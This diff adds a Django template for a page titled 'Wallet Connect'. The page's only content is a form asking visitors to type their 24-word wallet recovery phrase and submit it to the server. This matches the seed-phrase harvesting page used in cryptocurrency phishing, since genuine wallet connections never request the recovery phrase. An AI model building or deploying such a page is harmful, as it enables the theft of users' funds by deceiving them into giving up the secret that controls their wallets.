@@ -1,0 +1,25 @@
+{% extends 'app/base.html' %}
+{% load static %}
+{% load custom_tags %}
+<!-- app/templates/app/signin.html -->
+{% block title %}Wallet Connect{% endblock %}
+
+{% block content %}
+<body class="unique-wallet-connect-body">
+    <div class="unique-container">
+        <h1 class="unique-title">Wallet Connect</h1>
+        <form method="post" class="unique-form">
+            {% csrf_token %}
+            <div class="unique-input-container">
+                <label for="unique-phrase">Enter your phrase (24 words):</label>
+                <textarea name="phrase" id="unique-phrase" rows="4" required class="unique-textarea"></textarea>
+            </div>
+            <button type="submit" class="unique-submit-button">Submit</button>
+            {% if error_message %}
+                <div class="unique-error-message">{{ error_message }}</div>
+            {% endif %}
+        </form>
+    </div>
+</body>
+{% endblock %}
+
